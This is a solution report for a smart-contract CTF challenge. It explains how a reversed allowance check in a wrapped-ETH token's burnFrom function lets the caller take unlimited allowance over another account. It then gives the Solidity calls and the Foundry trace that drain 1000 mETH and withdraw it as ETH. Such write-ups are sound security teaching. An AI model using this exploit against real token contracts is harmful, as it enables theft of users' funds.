# Challenge 1: Operation magic redemption - Solution Report

## Problem Overview

### Contract Summary

The challenge revolves around the `MagicETH` contract, which is an ERC20 token implementation designed to wrap ETH. Its main functionalities include:

1. `deposit()`: Allows users to deposit ETH and receive an equivalent amount of mETH tokens.
2. `withdraw(uint256 amount)`: Enables users to burn mETH tokens and receive the corresponding ETH.
3. `burnFrom(address account, uint256 amount)`: Allows burning tokens from a specified account, given proper allowance.

### Initial Setup

- The `MagicETH` contract is deployed with 1000 ETH deposited.
- The `exploiter` address is given control of 1000 mETH tokens.
- The `whitehat` address starts with 0 mETH and 0 ETH.

### Success Criteria

To successfully complete the challenge, the `whitehat` must:

1. Recover 1000 mETH from the `exploiter` address.
2. Convert the recovered 1000 mETH to 1000 ETH.

The test will pass if the `whitehat` address ends up with a balance of 1000 ETH.

## Vulnerability

The primary vulnerability in the `MagicETH` contract lies in the `burnFrom` function. The problematic code is on lines 33-40:

```solidity
function burnFrom(address account, uint256 amount) public {
    uint256 currentAllowance = allowance(msg.sender, account);
    require(currentAllowance >= amount, "ERC20: insufficient allowance");

    // decrease allowance
    _approve(account, msg.sender, currentAllowance - amount);

    // burn
    _burn(account, amount);
}
```

The vulnerability stems from two key issues:

1. **Incorrect Allowance Check**: The function checks if the caller (`msg.sender`) has been approved by the `account` to spend tokens. However, this is the reverse of what it should be. It should check if the `account` has approved `msg.sender` to spend tokens.

2. **Misuse of `_approve`**: The function calls `_approve(account, msg.sender, currentAllowance - amount)`. This effectively sets an approval from `account` to `msg.sender`, which is backwards. It should be setting an approval from `msg.sender` to `account`.

These issues allow an attacker to manipulate approvals in unexpected ways. Specifically, by calling `burnFrom` with an amount of 0, an attacker can set their own address to have maximum allowance for spending the tokens of any other address, without actually burning any tokens or requiring any pre-existing approval.

## Attack Process

The attack to recover the 1000 mETH from the exploiter and convert it to ETH can be carried out in the following steps:

1. **Approve Exploiter**:

   - The whitehat first approves the exploiter to spend their tokens.
   - This step is necessary to pass the allowance check in the `burnFrom` function.

2. **Exploit `burnFrom` Vulnerability**:

   - The whitehat calls `burnFrom(exploiter, 0)`.
   - This exploits the vulnerability in the `burnFrom` function.
   - As a result, the whitehat gains maximum allowance to spend the exploiter's tokens.
   - No tokens are actually burned due to the amount being 0.

3. **Transfer Exploiter's Tokens**:

   - Using the gained allowance, the whitehat transfers all 1000 mETH from the exploiter to themselves.
   - This is done using the `transferFrom` function of the ERC20 standard.

4. **Withdraw ETH**:
   - Now holding 1000 mETH, the whitehat calls the `withdraw` function.
   - This burns the 1000 mETH and transfers the corresponding 1000 ETH to the whitehat.

By the end of this process, the whitehat has successfully recovered the 1000 mETH from the exploiter and converted it to 1000 ETH, meeting the challenge's success criteria.

## Proof of Concept (PoC)

### Core Implementation

The core implementation of the attack is carried out in the `testExploit` function of the `Challenge1Test` contract. Here's the step-by-step breakdown:

1. Approve Exploiter:

```solidity
mETH.approve(exploiter, type(uint256).max);
```

This approves the exploiter to spend the maximum possible amount of the whitehat's tokens.

2. Exploit `burnFrom` Vulnerability:

```solidity
mETH.burnFrom(exploiter, 0);
```

This call exploits the vulnerability in the `burnFrom` function, giving the whitehat maximum allowance to spend the exploiter's tokens.

3. Transfer Exploiter's Tokens:

```solidity
mETH.transferFrom(exploiter, whitehat, 1000 ether);
```

Using the gained allowance, this transfers all 1000 mETH from the exploiter to the whitehat.

4. Withdraw ETH:

```solidity
mETH.withdraw(1000 ether);
```

This burns the 1000 mETH and withdraws the corresponding 1000 ETH to the whitehat's address.

### Running Result

```
Ran 1 test for test/Challenge1.t.sol:Challenge1Test
[PASS] testExploit() (gas: 114169)
Traces:
  [143669] Challenge1Test::testExploit()
    ├─ [0] VM::startPrank(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA])
    │   └─ ← [Return]
    ├─ [24651] MagicETH::approve(exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], spender: exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [31504] MagicETH::burnFrom(exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], 0)
    │   ├─ emit Approval(owner: exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], spender: whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Transfer(from: exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], to: 0x0000000000000000000000000000000000000000, value: 0)
    │   └─ ← [Stop]
    ├─ [563] MagicETH::balanceOf(exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [826] MagicETH::allowance(exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [28254] MagicETH::transferFrom(exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: exploiter: [0x5Bf3eeB5560eEACC941C553320999006D27dD42b], to: whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], value: 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [563] MagicETH::balanceOf(whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [40291] MagicETH::withdraw(1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: whitehat: [0x1Fdb41DEB6100767eb8d3Dc7003D761f6a4b55cA], to: 0x0000000000000000000000000000000000000000, value: 1000000000000000000000 [1e21])
    │   ├─ [0] whitehat::fallback{value: 1000000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]
```
